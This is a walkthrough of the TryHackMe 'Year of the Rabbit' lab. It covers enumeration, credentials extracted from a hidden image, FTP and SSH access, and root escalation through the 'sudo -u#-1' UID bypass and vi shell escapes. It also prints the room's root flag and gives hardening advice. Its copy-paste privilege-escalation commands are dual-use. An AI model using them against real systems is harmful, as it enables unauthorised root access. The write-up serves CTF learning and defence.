# Year of the Rabbit — TryHackMe Walkthrough & Documentation

**Author:** your-username
**Date:** 2025-09-22
**Target:** `10.10.198.165` (Year of the Rabbit — TryHackMe)
**Purpose:** Public write-up / GitHub README documenting how I solved the box (enumeration, initial access, privilege escalation, remediation).

---

# TL;DR

A web asset (hidden directory + image) leaked credentials. FTP access allowed downloading credentials, which led to SSH access as `eli`. From there I discovered a second user `gwendoline`. `sudo -l` for `gwendoline` showed a risky `NOPASSWD` entry for `vi` with `!root`. Using a numeric UID bypass (`sudo -u#-1`) to run `vi` allowed spawning a root shell via `vi`’s shell escape, which yielded the root flag.

---

# Table of Contents

* [Reconnaissance](#reconnaissance)
* [Initial access](#initial-access)
* [Privilege escalation](#privilege-escalation)
* [Root access](#root-access)
* [Commands used (quick copy/paste)](#commands-used-quick-copypaste)
* [Why the `sudo` vector worked](#why-the-sudo-vector-worked)
* [Remediation & hardening](#remediation--hardening)
* [Lessons learned](#lessons-learned)
* [References](#references)

---

# Reconnaissance

Initial port/service scan with Nmap:

```bash
nmap -sV 10.10.198.165
```

Key results:

* `21/tcp` — ftp (vsftpd 3.0.2)
* `22/tcp` — ssh (OpenSSH 6.7p1 Debian)
* `80/tcp` — http (Apache 2.4.10)

Web content enumeration with Gobuster found a few interesting entries (and the stylesheet contained a comment hinting at a secret PHP file):

```text
/htaccess (403)
/assets (301 -> /assets/)
index.html (200)
/server-status (403)
```

Inspecting site assets and a discovered hidden directory revealed `Hot_Babe.png` inside `/WExYY2Cv-qU/`. Downloading and running `strings` on that PNG produced a username (`ftpuser`) and a large list of candidate passwords.

---

# Initial access

1. Downloaded the image asset and extracted strings:

```bash
wget http://10.10.198.165/WExYY2Cv-qU/Hot_Babe.png
strings Hot_Babe.png | grep -i ftpuser -A60
```

2. Brute-forced/accessed FTP with `ftpuser` and the candidate-password list (or manually checked the likely password). Logged into FTP and retrieved `Eli's_Creds.txt`:

```bash
ftp 10.10.198.165
# login as ftpuser with the discovered password
get "Eli's_Creds.txt"
```

3. SSH as `eli` using the credentials from `Eli's_Creds.txt`:

```bash
ssh eli@10.10.198.165
```

Inside `eli`’s account, enumeration found evidence and other accounts, including `gwendoline`. The `user.txt` for `gwendoline` was found in her home directory (user flag).

---

# Privilege escalation

As `gwendoline` I ran:

```bash
sudo -l
```

Which reported:

```
(ALL, !root) NOPASSWD: /usr/bin/vi /home/gwendoline/user.txt
```

Interpretation:

* `gwendoline` can run `/usr/bin/vi /home/gwendoline/user.txt` without a password as any target user **except root** (because of the `!root` entry).
* The interesting twist: supplying a numeric UID to `sudo` bypasses textual `!root` checks in this environment. Running `sudo -u#-1` allowed running the permitted command with effective privileges that allowed escalation:

From `gwendoline`:

```bash
sudo -u#-1 /usr/bin/vi /home/gwendoline/user.txt
```

This dropped me into `vi` running with elevated privileges. `vi` supports shell escapes, so from inside `vi` I spawned a root shell:

Inside `vi`:

```
:!bash -i
# or :!sh
# Or if needed:
:set shell=/bin/bash
:shell
```

Now I had a root shell.

---

# Root access

Once the shell was spawned from `vi`:

```bash
whoami
# => root

cat /root/root.txt
# => THM{8d6f163a87a1c80de27a4fd61aef0f3a0ecf9161}
```

Root flag obtained and box rooted.

---

# Commands used (quick copy/paste)

```bash
# Recon
nmap -sV 10.10.198.165
gobuster dir -u http://10.10.198.165 -w /usr/share/wordlists/dirb/common.txt -t 5

# Download and inspect asset
wget http://10.10.198.165/WExYY2Cv-qU/Hot_Babe.png
strings Hot_Babe.png | less

# FTP (example)
ftp 10.10.198.165
# login: ftpuser : <password-from-strings>
get "Eli's_Creds.txt"
bye

# SSH as eli
ssh eli@10.10.198.165

# As gwendoline
sudo -l

# Numeric UID trick
sudo -u#-1 /usr/bin/vi /home/gwendoline/user.txt

# From vi spawn shell:
:!bash -i

# On shell (now root)
whoami
cat /root/root.txt
```

> Note: The specific credential used for FTP and the method of extracting it (strings on image) is how the initial access was achieved on this box.

---

# Why the `sudo` vector worked (brief technical explanation)

* The sudoers entry used a textual prohibition `!root` to prevent running `/usr/bin/vi /home/gwendoline/user.txt` as root. However, `sudo` accepts numeric UIDs with `-u#<uid>`. Some `sudo` parsing/implementation behavior means supplying `-u#-1` (a numeric UID) bypasses the textual check in this scenario and results in `vi` running with effective privileged context.
* Once `vi` ran in that privileged context, `vi`’s features (`:!`, `:shell`, embedded scripting like `:python`) allowed spawning an interactive shell under the elevated privileges, giving a root shell.

---

# Remediation & hardening (recommended changes)

If you are securing a real system, do **not** allow this misconfiguration in production. Recommended actions:

1. **Eliminate `NOPASSWD` for interactive editors/shells.**
   Never allow editors, shells, or programs that can execute arbitrary commands to be run with `NOPASSWD`.

2. **Avoid broad sudoers entries and `ALL` targets.**
   Be explicit: specify exactly which commands and which arguments are allowed, and which exact target user is permitted. Avoid text-negations like `!root`; they can be brittle.

3. **Use wrapper scripts for privileged tasks.**
   If you must give a user the ability to perform a privileged action, create a small, audited wrapper that validates inputs and performs only the intended action.

4. **Use `visudo` to edit sudoers** and audit `/etc/sudoers.d/`. Regularly review entries.

5. **Restrict `vi`/`vim` capabilities** for accounts that must run them via sudo (if you must) — though the safer route is to not allow editors at all.

6. **Use strong authentication & least privilege** across accounts; reduce the surface for lateral movement.

7. **Logging/alerting.** Ensure sudo, auth, and shell events are centrally logged and monitored.

---

# Lessons learned

* Web assets (images, scripts, CSS) can leak secrets. Always inspect uploads and binaries for embedded content.
* Sudoers misconfigurations are a frequent and powerful escalation vector — be extremely conservative with `NOPASSWD` and with commands that can spawn shells.
* Numeric UID/argument parsing quirks in administrative tooling can be abused; explicit allow-lists are safer than broad or negated patterns.

---

# References

* `man sudoers` — sudoers specification and best practices
* TryHackMe — Year of the Rabbit (room)
* Various blog posts / CTF writeups describing `sudo -u#-1` / UID numeric bypass patterns (search for “sudo numeric uid bypass” for more background)
